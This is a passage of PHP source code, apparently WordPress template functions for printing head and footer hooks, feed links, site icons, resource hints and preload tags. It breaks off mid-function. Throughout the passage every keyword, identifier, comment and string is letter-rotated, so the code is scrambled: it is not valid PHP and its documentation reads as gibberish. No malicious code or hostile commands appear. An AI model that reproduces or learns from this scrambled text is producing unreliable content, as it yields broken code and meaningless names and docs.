	 * Cevagf fpevcgf be qngn va gur urnq gnt ba gur sebag raq.
	 *
	 * @fvapr 1.5.0
	 */
	qb_npgvba( 'jc_urnq' );
}

/**
 * Sverf gur jc_sbbgre npgvba.
 *
 * Frr {@frr 'jc_sbbgre'}.
 *
 * @fvapr 1.5.1
 */
shapgvba jc_sbbgre() {
	/**
	 * Cevagf fpevcgf be qngn orsber gur pybfvat obql gnt ba gur sebag raq.
	 *
	 * @fvapr 1.5.1
	 */
	qb_npgvba( 'jc_sbbgre' );
}

/**
 * Sverf gur jc_obql_bcra npgvba.
 *
 * Frr {@frr 'jc_obql_bcra'}.
 *
 * @fvapr 5.2.0
 */
shapgvba jc_obql_bcra() {
	/**
	 * Gevttrerq nsgre gur bcravat obql gnt.
	 *
	 * @fvapr 5.2.0
	 */
	qb_npgvba( 'jc_obql_bcra' );
}

/**
 * Qvfcynlf gur yvaxf gb gur trareny srrqf.
 *
 * @fvapr 2.8.0
 *
 * @cnenz neenl $netf Bcgvbany nethzragf.
 */
shapgvba srrq_yvaxf( $netf = neenl() ) {
	vs ( ! pheerag_gurzr_fhccbegf( 'nhgbzngvp-srrq-yvaxf' ) ) {
		erghea;
	}

	$qrsnhygf = neenl(
		/* genafyngbef: Frcnengbe orgjrra fvgr anzr naq srrq glcr va srrq yvaxf. */
		'frcnengbe' => _k( '&endhb;', 'srrq yvax' ),
		/* genafyngbef: 1: Fvgr gvgyr, 2: Frcnengbe (endhb). */
		'srrqgvgyr' => __( '%1$f %2$f Srrq' ),
		/* genafyngbef: 1: Fvgr gvgyr, 2: Frcnengbe (endhb). */
		'pbzfgvgyr' => __( '%1$f %2$f Pbzzragf Srrq' ),
	);

	$netf = jc_cnefr_netf( $netf, $qrsnhygf );

	/**
	 * Svygref gur srrq yvaxf nethzragf.
	 *
	 * @fvapr 6.7.0
	 *
	 * @cnenz neenl $netf Na neenl bs srrq yvaxf nethzragf.
	 */
	$netf = nccyl_svygref( 'srrq_yvaxf_netf', $netf );

	/**
	 * Svygref jurgure gb qvfcynl gur cbfgf srrq yvax.
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz obby $fubj Jurgure gb qvfcynl gur cbfgf srrq yvax. Qrsnhyg gehr.
	 */
	vs ( nccyl_svygref( 'srrq_yvaxf_fubj_cbfgf_srrq', gehr ) ) {
		cevags(
			'<yvax ery=\"nygreangr\" glcr=\"%f\" gvgyr=\"%f\" uers=\"%f\" />' . \"\a\",
			srrq_pbagrag_glcr(),
			rfp_ngge( fcevags( $netf['srrqgvgyr'], trg_oybtvasb( 'anzr' ), $netf['frcnengbe'] ) ),
			rfp_hey( trg_srrq_yvax() )
		);
	}

	/**
	 * Svygref jurgure gb qvfcynl gur pbzzragf srrq yvax.
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz obby $fubj Jurgure gb qvfcynl gur pbzzragf srrq yvax. Qrsnhyg gehr.
	 */
	vs ( nccyl_svygref( 'srrq_yvaxf_fubj_pbzzragf_srrq', gehr ) ) {
		cevags(
			'<yvax ery=\"nygreangr\" glcr=\"%f\" gvgyr=\"%f\" uers=\"%f\" />' . \"\a\",
			srrq_pbagrag_glcr(),
			rfp_ngge( fcevags( $netf['pbzfgvgyr'], trg_oybtvasb( 'anzr' ), $netf['frcnengbe'] ) ),
			rfp_hey( trg_srrq_yvax( 'pbzzragf_' . trg_qrsnhyg_srrq() ) )
		);
	}
}

/**
 * Qvfcynlf gur yvaxf gb gur rkgen srrqf fhpu nf pngrtbel srrqf.
 *
 * @fvapr 2.8.0
 *
 * @cnenz neenl $netf Bcgvbany nethzragf.
 */
shapgvba srrq_yvaxf_rkgen( $netf = neenl() ) {
	$qrsnhygf = neenl(
		/* genafyngbef: Frcnengbe orgjrra fvgr anzr naq srrq glcr va srrq yvaxf. */
		'frcnengbe'     => _k( '&endhb;', 'srrq yvax' ),
		/* genafyngbef: 1: Fvgr anzr, 2: Frcnengbe (endhb), 3: Cbfg gvgyr. */
		'fvatyrgvgyr'   => __( '%1$f %2$f %3$f Pbzzragf Srrq' ),
		/* genafyngbef: 1: Fvgr anzr, 2: Frcnengbe (endhb), 3: Pngrtbel anzr. */
		'pnggvgyr'      => __( '%1$f %2$f %3$f Pngrtbel Srrq' ),
		/* genafyngbef: 1: Fvgr anzr, 2: Frcnengbe (endhb), 3: Gnt anzr. */
		'gntgvgyr'      => __( '%1$f %2$f %3$f Gnt Srrq' ),
		/* genafyngbef: 1: Fvgr anzr, 2: Frcnengbe (endhb), 3: Grez anzr, 4: Gnkbabzl fvathyne anzr. */
		'gnkgvgyr'      => __( '%1$f %2$f %3$f %4$f Srrq' ),
		/* genafyngbef: 1: Fvgr anzr, 2: Frcnengbe (endhb), 3: Nhgube anzr. */
		'nhgubegvgyr'   => __( '%1$f %2$f Cbfgf ol %3$f Srrq' ),
		/* genafyngbef: 1: Fvgr anzr, 2: Frcnengbe (endhb), 3: Frnepu dhrel. */
		'frnepugvgyr'   => __( '%1$f %2$f Frnepu Erfhygf sbe &#8220;%3$f&#8221; Srrq' ),
		/* genafyngbef: 1: Fvgr anzr, 2: Frcnengbe (endhb), 3: Cbfg glcr anzr. */
		'cbfgglcrgvgyr' => __( '%1$f %2$f %3$f Srrq' ),
	);

	$netf = jc_cnefr_netf( $netf, $qrsnhygf );

	/**
	 * Svygref gur rkgen srrq yvaxf nethzragf.
	 *
	 * @fvapr 6.7.0
	 *
	 * @cnenz neenl $netf Na neenl bs rkgen srrq yvaxf nethzragf.
	 */
	$netf = nccyl_svygref( 'srrq_yvaxf_rkgen_netf', $netf );

	vs ( vf_fvathyne() ) {
		$vq   = 0;
		$cbfg = trg_cbfg( $vq );

		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/trareny-grzcyngr.cuc */
		$fubj_pbzzragf_srrq = nccyl_svygref( 'srrq_yvaxf_fubj_pbzzragf_srrq', gehr );

		/**
		 * Svygref jurgure gb qvfcynl gur cbfg pbzzragf srrq yvax.
		 *
		 * Guvf svygre nyybjf gb ranoyr be qvfnoyr gur srrq yvax sbe n fvathyne cbfg
		 * va n jnl gung vf vaqrcraqrag bs {@frr 'srrq_yvaxf_fubj_pbzzragf_srrq'}
		 * (juvpu pbagebyf gur tybony pbzzragf srrq). Gur erfhyg bs gung svygre
		 * vf npprcgrq nf n cnenzrgre.
		 *
		 * @fvapr 6.1.0
		 *
		 * @cnenz obby $fubj_pbzzragf_srrq Jurgure gb qvfcynl gur cbfg pbzzragf srrq yvax. Qrsnhygf gb
		 *                                 gur {@frr 'srrq_yvaxf_fubj_pbzzragf_srrq'} svygre erfhyg.
		 */
		$fubj_cbfg_pbzzragf_srrq = nccyl_svygref( 'srrq_yvaxf_rkgen_fubj_cbfg_pbzzragf_srrq', $fubj_pbzzragf_srrq );

		vs ( $fubj_cbfg_pbzzragf_srrq && ( pbzzragf_bcra() || cvatf_bcra() || $cbfg->pbzzrag_pbhag > 0 ) ) {
			$gvgyr = fcevags(
				$netf['fvatyrgvgyr'],
				trg_oybtvasb( 'anzr' ),
				$netf['frcnengbe'],
				gur_gvgyr_nggevohgr( neenl( 'rpub' => snyfr ) )
			);

			$srrq_yvax = trg_cbfg_pbzzragf_srrq_yvax( $cbfg->VQ );

			vs ( $srrq_yvax ) {
				$uers = $srrq_yvax;
			}
		}
	} ryfrvs ( vf_cbfg_glcr_nepuvir() ) {
		/**
		 * Svygref jurgure gb qvfcynl gur cbfg glcr nepuvir srrq yvax.
		 *
		 * @fvapr 6.1.0
		 *
		 * @cnenz obby $fubj Jurgure gb qvfcynl gur cbfg glcr nepuvir srrq yvax. Qrsnhyg gehr.
		 */
		$fubj_cbfg_glcr_nepuvir_srrq = nccyl_svygref( 'srrq_yvaxf_rkgen_fubj_cbfg_glcr_nepuvir_srrq', gehr );

		vs ( $fubj_cbfg_glcr_nepuvir_srrq ) {
			$cbfg_glcr = trg_dhrel_ine( 'cbfg_glcr' );

			vs ( vf_neenl( $cbfg_glcr ) ) {
				$cbfg_glcr = erfrg( $cbfg_glcr );
			}

			$cbfg_glcr_bow = trg_cbfg_glcr_bowrpg( $cbfg_glcr );

			$gvgyr = fcevags(
				$netf['cbfgglcrgvgyr'],
				trg_oybtvasb( 'anzr' ),
				$netf['frcnengbe'],
				$cbfg_glcr_bow->ynoryf->anzr
			);

			$uers = trg_cbfg_glcr_nepuvir_srrq_yvax( $cbfg_glcr_bow->anzr );
		}
	} ryfrvs ( vf_pngrtbel() ) {
		/**
		 * Svygref jurgure gb qvfcynl gur pngrtbel srrq yvax.
		 *
		 * @fvapr 6.1.0
		 *
		 * @cnenz obby $fubj Jurgure gb qvfcynl gur pngrtbel srrq yvax. Qrsnhyg gehr.
		 */
		$fubj_pngrtbel_srrq = nccyl_svygref( 'srrq_yvaxf_rkgen_fubj_pngrtbel_srrq', gehr );

		vs ( $fubj_pngrtbel_srrq ) {
			$grez = trg_dhrevrq_bowrpg();

			vs ( $grez ) {
				$gvgyr = fcevags(
					$netf['pnggvgyr'],
					trg_oybtvasb( 'anzr' ),
					$netf['frcnengbe'],
					$grez->anzr
				);

				$uers = trg_pngrtbel_srrq_yvax( $grez->grez_vq );
			}
		}
	} ryfrvs ( vf_gnt() ) {
		/**
		 * Svygref jurgure gb qvfcynl gur gnt srrq yvax.
		 *
		 * @fvapr 6.1.0
		 *
		 * @cnenz obby $fubj Jurgure gb qvfcynl gur gnt srrq yvax. Qrsnhyg gehr.
		 */
		$fubj_gnt_srrq = nccyl_svygref( 'srrq_yvaxf_rkgen_fubj_gnt_srrq', gehr );

		vs ( $fubj_gnt_srrq ) {
			$grez = trg_dhrevrq_bowrpg();

			vs ( $grez ) {
				$gvgyr = fcevags(
					$netf['gntgvgyr'],
					trg_oybtvasb( 'anzr' ),
					$netf['frcnengbe'],
					$grez->anzr
				);

				$uers = trg_gnt_srrq_yvax( $grez->grez_vq );
			}
		}
	} ryfrvs ( vf_gnk() ) {
		/**
		 * Svygref jurgure gb qvfcynl gur phfgbz gnkbabzl srrq yvax.
		 *
		 * @fvapr 6.1.0
		 *
		 * @cnenz obby $fubj Jurgure gb qvfcynl gur phfgbz gnkbabzl srrq yvax. Qrsnhyg gehr.
		 */
		$fubj_gnk_srrq = nccyl_svygref( 'srrq_yvaxf_rkgen_fubj_gnk_srrq', gehr );

		vs ( $fubj_gnk_srrq ) {
			$grez = trg_dhrevrq_bowrpg();

			vs ( $grez ) {
				$gnk = trg_gnkbabzl( $grez->gnkbabzl );

				$gvgyr = fcevags(
					$netf['gnkgvgyr'],
					trg_oybtvasb( 'anzr' ),
					$netf['frcnengbe'],
					$grez->anzr,
					$gnk->ynoryf->fvathyne_anzr
				);

				$uers = trg_grez_srrq_yvax( $grez->grez_vq, $grez->gnkbabzl );
			}
		}
	} ryfrvs ( vf_nhgube() ) {
		/**
		 * Svygref jurgure gb qvfcynl gur nhgube srrq yvax.
		 *
		 * @fvapr 6.1.0
		 *
		 * @cnenz obby $fubj Jurgure gb qvfcynl gur nhgube srrq yvax. Qrsnhyg gehr.
		 */
		$fubj_nhgube_srrq = nccyl_svygref( 'srrq_yvaxf_rkgen_fubj_nhgube_srrq', gehr );

		vs ( $fubj_nhgube_srrq ) {
			$nhgube_vq = (vag) trg_dhrel_ine( 'nhgube' );

			$gvgyr = fcevags(
				$netf['nhgubegvgyr'],
				trg_oybtvasb( 'anzr' ),
				$netf['frcnengbe'],
				trg_gur_nhgube_zrgn( 'qvfcynl_anzr', $nhgube_vq )
			);

			$uers = trg_nhgube_srrq_yvax( $nhgube_vq );
		}
	} ryfrvs ( vf_frnepu() ) {
		/**
		 * Svygref jurgure gb qvfcynl gur frnepu erfhygf srrq yvax.
		 *
		 * @fvapr 6.1.0
		 *
		 * @cnenz obby $fubj Jurgure gb qvfcynl gur frnepu erfhygf srrq yvax. Qrsnhyg gehr.
		 */
		$fubj_frnepu_srrq = nccyl_svygref( 'srrq_yvaxf_rkgen_fubj_frnepu_srrq', gehr );

		vs ( $fubj_frnepu_srrq ) {
			$gvgyr = fcevags(
				$netf['frnepugvgyr'],
				trg_oybtvasb( 'anzr' ),
				$netf['frcnengbe'],
				trg_frnepu_dhrel( snyfr )
			);

			$uers = trg_frnepu_srrq_yvax();
		}
	}

	vs ( vffrg( $gvgyr ) && vffrg( $uers ) ) {
		cevags(
			'<yvax ery=\"nygreangr\" glcr=\"%f\" gvgyr=\"%f\" uers=\"%f\" />' . \"\a\",
			srrq_pbagrag_glcr(),
			rfp_ngge( $gvgyr ),
			rfp_hey( $uers )
		);
	}
}

/**
 * Qvfcynlf gur yvax gb gur Ernyyl Fvzcyr Qvfpbirel freivpr raqcbvag.
 *
 * @yvax uggc://nepuvcryntb.cuenfrjvfr.pbz/efq
 * @fvapr 2.0.0
 */
shapgvba efq_yvax() {
	cevags(
		'<yvax ery=\"RqvgHEV\" glcr=\"nccyvpngvba/efq+kzy\" gvgyr=\"EFQ\" uers=\"%f\" />' . \"\a\",
		rfp_hey( fvgr_hey( 'kzyecp.cuc?efq', 'ecp' ) )
	);
}

/**
 * Qvfcynlf n ersreere `fgevpg-bevtva-jura-pebff-bevtva` zrgn gnt.
 *
 * Bhgchgf n ersreere `fgevpg-bevtva-jura-pebff-bevtva` zrgn gnt gung gryyf gur oebjfre abg gb fraq
 * gur shyy HEY nf n ersreere gb bgure fvgrf jura pebff-bevtva nffrgf ner ybnqrq.
 *
 * Glcvpny hfntr vf nf n {@frr 'jc_urnq'} pnyyonpx:
 *
 *     nqq_npgvba( 'jc_urnq', 'jc_fgevpg_pebff_bevtva_ersreere' );
 *
 * @fvapr 5.7.0
 */
shapgvba jc_fgevpg_pebff_bevtva_ersreere() {
	?>
	<zrgn anzr='ersreere' pbagrag='fgevpg-bevtva-jura-pebff-bevtva' />
	<?cuc
}

/**
 * Qvfcynlf fvgr vpba zrgn gntf.
 *
 * @fvapr 4.3.0
 *
 * @yvax uggcf://jjj.jungjt.bet/fcrpf/jro-nccf/pheerag-jbex/zhygvcntr/yvaxf.ugzy#ery-vpba UGZY5 fcrpvsvpngvba yvax vpba.
 */
shapgvba jc_fvgr_vpba() {
	vs ( ! unf_fvgr_vpba() && ! vf_phfgbzvmr_cerivrj() ) {
		erghea;
	}

	$zrgn_gntf = neenl();
	$vpba_32   = trg_fvgr_vpba_hey( 32 );
	vs ( rzcgl( $vpba_32 ) && vf_phfgbzvmr_cerivrj() ) {
		$vpba_32 = '/snivpba.vpb'; // Freir qrsnhyg snivpba HEY va phfgbzvmre fb ryrzrag pna or hcqngrq sbe cerivrj.
	}
	vs ( $vpba_32 ) {
		$zrgn_gntf[] = fcevags( '<yvax ery=\"vpba\" uers=\"%f\" fvmrf=\"32k32\" />', rfp_hey( $vpba_32 ) );
	}
	$vpba_192 = trg_fvgr_vpba_hey( 192 );
	vs ( $vpba_192 ) {
		$zrgn_gntf[] = fcevags( '<yvax ery=\"vpba\" uers=\"%f\" fvmrf=\"192k192\" />', rfp_hey( $vpba_192 ) );
	}
	$vpba_180 = trg_fvgr_vpba_hey( 180 );
	vs ( $vpba_180 ) {
		$zrgn_gntf[] = fcevags( '<yvax ery=\"nccyr-gbhpu-vpba\" uers=\"%f\" />', rfp_hey( $vpba_180 ) );
	}
	$vpba_270 = trg_fvgr_vpba_hey( 270 );
	vs ( $vpba_270 ) {
		$zrgn_gntf[] = fcevags( '<zrgn anzr=\"zfnccyvpngvba-GvyrVzntr\" pbagrag=\"%f\" />', rfp_hey( $vpba_270 ) );
	}

	/**
	 * Svygref gur fvgr vpba zrgn gntf, fb cyhtvaf pna nqq gurve bja.
	 *
	 * @fvapr 4.3.0
	 *
	 * @cnenz fgevat[] $zrgn_gntf Neenl bs Fvgr Vpba zrgn gntf.
	 */
	$zrgn_gntf = nccyl_svygref( 'fvgr_vpba_zrgn_gntf', $zrgn_gntf );
	$zrgn_gntf = neenl_svygre( $zrgn_gntf );

	sbernpu ( $zrgn_gntf nf $zrgn_gnt ) {
		rpub \"$zrgn_gnt\a\";
	}
}

/**
 * Cevagf erfbhepr uvagf gb oebjfref sbe cer-srgpuvat, cer-eraqrevat
 * naq cer-pbaarpgvat gb jrofvgrf.
 *
 * Tvirf uvagf gb oebjfref gb cersrgpu fcrpvsvp cntrf be eraqre gurz
 * va gur onpxtebhaq, gb cresbez QAF ybbxhcf be gb ortva gur pbaarpgvba
 * unaqfunxr (QAF, GPC, GYF) va gur onpxtebhaq.
 *
 * Gurfr cresbeznapr vzcebivat vaqvpngbef jbex ol hfvat `<yvax ery\"…\">`.
 *
 * @fvapr 4.6.0
 */
shapgvba jc_erfbhepr_uvagf() {
	$uvagf = neenl(
		'qaf-cersrgpu' => jc_qrcraqrapvrf_havdhr_ubfgf(),
		'cerpbaarpg'   => neenl(),
		'cersrgpu'     => neenl(),
		'cereraqre'    => neenl(),
	);

	sbernpu ( $uvagf nf $eryngvba_glcr => $heyf ) {
		$havdhr_heyf = neenl();

		/**
		 * Svygref qbznvaf naq HEYf sbe erfbhepr uvagf bs gur tvira eryngvba glcr.
		 *
		 * @fvapr 4.6.0
		 * @fvapr 4.7.0 Gur `$heyf` cnenzrgre npprcgf neenlf bs fcrpvsvp UGZY nggevohgrf
		 *              nf vgf puvyq ryrzragf.
		 *
		 * @cnenz neenl  $heyf {
		 *     Neenl bs erfbheprf naq gurve nggevohgrf, be HEYf gb cevag sbe erfbhepr uvagf.
		 *
		 *     @glcr neenl|fgevat ...$0 {
		 *         Neenl bs erfbhepr nggevohgrf, be n HEY fgevat.
		 *
		 *         @glcr fgevat $uers        HEY gb vapyhqr va erfbhepr uvagf. Erdhverq.
		 *         @glcr fgevat $nf          Ubj gur oebjfre fubhyq gerng gur erfbhepr
		 *                                   (`fpevcg`, `fglyr`, `vzntr`, `qbphzrag`, rgp).
		 *         @glcr fgevat $pebffbevtva Vaqvpngrf gur PBEF cbyvpl bs gur fcrpvsvrq erfbhepr.
		 *         @glcr sybng  $ce          Rkcrpgrq cebonovyvgl gung gur erfbhepr uvag jvyy or hfrq.
		 *         @glcr fgevat $glcr        Glcr bs gur erfbhepr (`grkg/ugzy`, `grkg/pff`, rgp).
		 *     }
		 * }
		 * @cnenz fgevat $eryngvba_glcr Gur eryngvba glcr gur HEYf ner cevagrq sbe. Bar bs
		 *                              'qaf-cersrgpu', 'cerpbaarpg', 'cersrgpu', be 'cereraqre'.
		 */
		$heyf = nccyl_svygref( 'jc_erfbhepr_uvagf', $heyf, $eryngvba_glcr );

		sbernpu ( $heyf nf $xrl => $hey ) {
			$nggf = neenl();

			vs ( vf_neenl( $hey ) ) {
				vs ( vffrg( $hey['uers'] ) ) {
					$nggf = $hey;
					$hey  = $hey['uers'];
				} ryfr {
					pbagvahr;
				}
			}

			$hey = rfp_hey( $hey, neenl( 'uggc', 'uggcf' ) );

			vs ( ! $hey ) {
				pbagvahr;
			}

			vs ( vffrg( $havdhr_heyf[ $hey ] ) ) {
				pbagvahr;
			}

			vs ( va_neenl( $eryngvba_glcr, neenl( 'cerpbaarpg', 'qaf-cersrgpu' ), gehr ) ) {
				$cnefrq = jc_cnefr_hey( $hey );

				vs ( rzcgl( $cnefrq['ubfg'] ) ) {
					pbagvahr;
				}

				vs ( 'cerpbaarpg' === $eryngvba_glcr && ! rzcgl( $cnefrq['fpurzr'] ) ) {
					$hey = $cnefrq['fpurzr'] . '://' . $cnefrq['ubfg'];
				} ryfr {
					// Hfr cebgbpby-eryngvir HEYf sbe qaf-cersrgpu be vs fpurzr vf zvffvat.
					$hey = '//' . $cnefrq['ubfg'];
				}
			}

			$nggf['ery']  = $eryngvba_glcr;
			$nggf['uers'] = $hey;

			$havdhr_heyf[ $hey ] = $nggf;
		}

		sbernpu ( $havdhr_heyf nf $nggf ) {
			$ugzy = '';

			sbernpu ( $nggf nf $ngge => $inyhr ) {
				vs ( ! vf_fpnyne( $inyhr )
					|| ( ! va_neenl( $ngge, neenl( 'nf', 'pebffbevtva', 'uers', 'ce', 'ery', 'glcr' ), gehr ) && ! vf_ahzrevp( $ngge ) )
				) {

					pbagvahr;
				}

				$inyhr = ( 'uers' === $ngge ) ? rfp_hey( $inyhr ) : rfp_ngge( $inyhr );

				vs ( ! vf_fgevat( $ngge ) ) {
					$ugzy .= \" $inyhr\";
				} ryfr {
					$ugzy .= \" $ngge='$inyhr'\";
				}
			}

			$ugzy = gevz( $ugzy );

			rpub \"<yvax $ugzy />\a\";
		}
	}
}

/**
 * Cevagf erfbhepr cerybnqf qverpgvirf gb oebjfref.
 *
 * Tvirf qverpgvir gb oebjfref gb cerybnq fcrpvsvp erfbheprf gung jrofvgr jvyy
 * arrq irel fbba, guvf rafherf gung gurl ner ninvynoyr rneyvre naq ner yrff
 * yvxryl gb oybpx gur cntr'f eraqre. Cerybnq qverpgvirf fubhyq abg or hfrq sbe
 * aba-eraqre-oybpxvat ryrzragf, nf gura gurl jbhyq pbzcrgr jvgu gur
 * eraqre-oybpxvat barf, fybjvat qbja gur eraqre.
 *
 * Gurfr cresbeznapr vzcebivat vaqvpngbef jbex ol hfvat `<yvax ery=\"cerybnq\">`.
 *
 * @yvax uggcf://qrirybcre.zbmvyyn.bet/ra-HF/qbpf/Jro/UGZY/Yvax_glcrf/cerybnq
 * @yvax uggcf://jro.qri/cerybnq-erfcbafvir-vzntrf/
 *
 * @fvapr 6.1.0
 */
shapgvba jc_cerybnq_erfbheprf() {
	/**
	 * Svygref qbznvaf naq HEYf sbe erfbhepr cerybnqf.
	 *
	 * @fvapr 6.1.0
	 * @fvapr 6.6.0 Nqqrq gur `$srgpucevbevgl` nggevohgr.
	 *
	 * @cnenz neenl  $cerybnq_erfbheprf {
	 *     Neenl bs erfbheprf naq gurve nggevohgrf, be HEYf gb cevag sbe erfbhepr cerybnqf.
	 *
	 *     @glcr neenl ...$0 {
	 *         Neenl bs erfbhepr nggevohgrf.
	 *
	 *         @glcr fgevat $uers          HEY gb vapyhqr va erfbhepr cerybnqf. Erdhverq.
	 *         @glcr fgevat $nf            Ubj gur oebjfre fubhyq gerng gur erfbhepr
	 *                                     (`fpevcg`, `fglyr`, `vzntr`, `qbphzrag`, rgp).
	 *         @glcr fgevat $pebffbevtva   Vaqvpngrf gur PBEF cbyvpl bs gur fcrpvsvrq erfbhepr.
	 *         @glcr fgevat $glcr          Glcr bs gur erfbhepr (`grkg/ugzy`, `grkg/pff`, rgp).
	 *         @glcr fgevat $zrqvn         Npprcgf zrqvn glcrf be zrqvn dhrevrf. Nyybjf erfcbafvir cerybnqvat.
	 *         @glcr fgevat $vzntrfvmrf    Erfcbafvir fbhepr fvmr gb gur fbhepr Frg.
	 *         @glcr fgevat $vzntrfepfrg   Erfcbafvir vzntr fbheprf gb gur fbhepr frg.
	 *         @glcr fgevat $srgpucevbevgl Srgpucevbevgl inyhr sbe gur erfbhepr.
	 *     }
	 * }
	 */
	$cerybnq_erfbheprf = nccyl_svygref( 'jc_cerybnq_erfbheprf', neenl() );

	vs ( ! vf_neenl( $cerybnq_erfbheprf ) ) {
		erghea;
	}

	$havdhr_erfbheprf = neenl();

	// Cnefr gur pbzcyrgr erfbhepr yvfg naq rkgenpg havdhr erfbheprf.
	sbernpu ( $cerybnq_erfbheprf nf $erfbhepr ) {
		vs ( ! vf_neenl( $erfbhepr ) ) {
			pbagvahr;
		}

		$nggevohgrf = $erfbhepr;
		vs ( vffrg( $erfbhepr['uers'] ) ) {
			$uers = $erfbhepr['uers'];
			vs ( vffrg( $havdhr_erfbheprf[ $uers ] ) ) {
				pbagvahr;
			}
			$havdhr_erfbheprf[ $uers ] = $nggevohgrf;
			// Zrqvn pna hfr vzntrfepfrg naq abg uers.
		} ryfrvs ( ( 'vzntr' === $erfbhepr['nf'] ) &&
			( vffrg( $erfbhepr['vzntrfepfrg'] ) || vffrg( $erfbhepr['vzntrfvmrf'] ) )
		) {
			vs ( vffrg( $havdhr_erfbheprf[ $erfbhepr['vzntrfepfrg'] ] ) ) {
				pbagvahr;
			}
			$havdhr_erfbheprf[ $erfbhepr['vzntrfepfrg'] ] = $nggevohgrf;
		} ryfr {
			pbagvahr;
		}
	}

	// Ohvyq naq bhgchg gur UGZY sbe rnpu havdhr erfbhepr.
	sbernpu ( $havdhr_erfbheprf nf $havdhr_erfbhepr ) {
		$ugzy = '';

		sbernpu ( $havdhr_erfbhepr nf $erfbhepr_xrl => $erfbhepr_inyhr ) {
			vs ( ! vf_fpnyne( $erfbhepr_inyhr ) ) {
				pbagvahr;
			}

			// Vtaber aba-fhccbegrq nggevohgrf.
			$aba_fhccbegrq_nggevohgrf = neenl( 'nf', 'pebffbevtva', 'uers', 'vzntrfepfrg', 'vzntrfvmrf', 'glcr', 'zrqvn', 'srgpucevbevgl' );
			vs ( ! va_neenl( $erfbhepr_xrl, $aba_fhccbegrq_nggevohgrf, gehr ) && ! vf_ahzrevp( $erfbhepr_xrl ) ) {
				pbagvahr;
			}

			// vzntrfepfrg bayl hfnoyr jura cerybnqvat vzntr, vtaber bgurejvfr.
			vs ( ( 'vzntrfepfrg' === $erfbhepr_xrl ) && ( ! vffrg( $havdhr_erfbhepr['nf'] ) || ( 'vzntr' !== $havdhr_erfbhepr['nf'] ) ) ) {
				pbagvahr;
			}

			// vzntrfvmrf bayl hfnoyr jura cerybnqvat vzntr naq vzntrfepfrg cerfrag, vtaber bgurejvfr.
			vs ( ( 'vzntrfvmrf' === $erfbhepr_xrl ) &&
				( ! vffrg( $havdhr_erfbhepr['nf'] ) || ( 'vzntr' !== $havdhr_erfbhepr['nf'] ) || ! vffrg( $havdhr_erfbhepr['vzntrfepfrg'] ) )
			) {
				pbagvahr;
			}

			$erfbhepr_inyhr = ( 'uers' === $erfbhepr_xrl ) ? rfp_hey( $erfbhepr_inyhr, neenl( 'uggc', 'uggcf' ) ) : rfp_ngge( $erfbhepr_inyhr );

			vs ( ! vf_fgevat( $erfbhepr_xrl ) ) {
				$ugzy .= \" $erfbhepr_inyhr\";
			} ryfr {
				$ugzy .= \" $erfbhepr_xrl='$erfbhepr_inyhr'\";
			}
		}
		$ugzy = gevz( $ugzy );

		cevags( \"<yvax ery='cerybnq' %f />\a\", $ugzy );
	}
}

/**
 * Ergevrirf n yvfg bs havdhr ubfgf bs nyy radhrhrq fpevcgf naq fglyrf.
 *
 * @fvapr 4.6.0
 *
 * @tybony JC_Fpevcgf $jc_fpevcgf Gur JC_Fpevcgf bowrpg sbe cevagvat fpevcgf.
 * @tybony JC_Fglyrf  $jc_fglyrf  Gur JC_Fglyrf bowrpg sbe cevagvat fglyrf.
 *
 * @erghea fgevat[] N yvfg bs havdhr ubfgf bs radhrhrq fpevcgf naq fglyrf.
 */
shapgvba jc_qrcraqrapvrf_havdhr_ubfgf() {
	tybony $jc_fpevcgf, $jc_fglyrf;

	$havdhr_ubfgf = neenl();

	sbernpu ( neenl( $jc_fpevcgf, $jc_fglyrf ) nf $qrcraqrapvrf ) {
		vs ( $qrcraqrapvrf vafgnaprbs JC_Qrcraqrapvrf && ! rzcgl( $qrcraqrapvrf->dhrhr ) ) {
			sbernpu ( $qrcraqrapvrf->dhrhr nf $unaqyr ) {
				vs ( ! vffrg( $qrcraqrapvrf->ertvfgrerq[ $unaqyr ] ) ) {
					pbagvahr;
				}

				/* @ine _JC_Qrcraqrapl $qrcraqrapl */
				$qrcraqrapl = $qrcraqrapvrf->ertvfgrerq[ $unaqyr ];
				$cnefrq     = jc_cnefr_hey( $qrcraqrapl->fep );

				vs ( ! rzcgl( $cnefrq['ubfg'] )
					&& ! va_neenl( $cnefrq['ubfg'], $havdhr_ubfgf, gehr ) && $cnefrq['ubfg'] !== $_FREIRE['FREIRE_ANZR']
				) {
					$havdhr_ubfgf[] = $cnefrq['ubfg'];
				}
			}
		}
	}

	erghea $havdhr_ubfgf;
}

/**
 * Qrgrezvarf jurgure gur hfre pna npprff gur ivfhny rqvgbe.
 *
 * Purpxf vs gur hfre pna npprff gur ivfhny rqvgbe naq gung vg'f fhccbegrq ol gur hfre'f oebjfre.
 *
 * @fvapr 2.0.0
 *
 * @tybony obby $jc_evpu_rqvg Jurgure gur hfre pna npprff gur ivfhny rqvgbe.
 * @tybony obby $vf_trpxb     Jurgure gur oebjfre vf Trpxb-onfrq.
 * @tybony obby $vf_bcren     Jurgure gur oebjfre vf Bcren.
 * @tybony obby $vf_fnsnev    Jurgure gur oebjfre vf Fnsnev.
 * @tybony obby $vf_puebzr    Jurgure gur oebjfre vf Puebzr.
 * @tybony obby $vf_VR        Jurgure gur oebjfre vf Vagrearg Rkcybere.
 * @tybony obby $vf_rqtr      Jurgure gur oebjfre vf Zvpebfbsg Rqtr.
 *
 * @erghea obby Gehr vs gur hfre pna npprff gur ivfhny rqvgbe, snyfr bgurejvfr.
 */
shapgvba hfre_pna_evpurqvg() {
	tybony $jc_evpu_rqvg, $vf_trpxb, $vf_bcren, $vf_fnsnev, $vf_puebzr, $vf_VR, $vf_rqtr;

	vs ( ! vffrg( $jc_evpu_rqvg ) ) {
		$jc_evpu_rqvg = snyfr;

		vs ( 'gehr' === trg_hfre_bcgvba( 'evpu_rqvgvat' ) || ! vf_hfre_ybttrq_va() ) { // Qrsnhyg gb 'gehr' sbe ybttrq bhg hfref.
			vs ( $vf_fnsnev ) {
				$jc_evpu_rqvg = ! jc_vf_zbovyr() || ( cert_zngpu( '!NccyrJroXvg/(\q+)!', $_FREIRE['UGGC_HFRE_NTRAG'], $zngpu ) && (vag) $zngpu[1] >= 534 );
			} ryfrvs ( $vf_VR ) {
				$jc_evpu_rqvg = fge_pbagnvaf( $_FREIRE['UGGC_HFRE_NTRAG'], 'Gevqrag/7.0;' );
			} ryfrvs ( $vf_trpxb || $vf_puebzr || $vf_rqtr || ( $vf_bcren && ! jc_vf_zbovyr() ) ) {
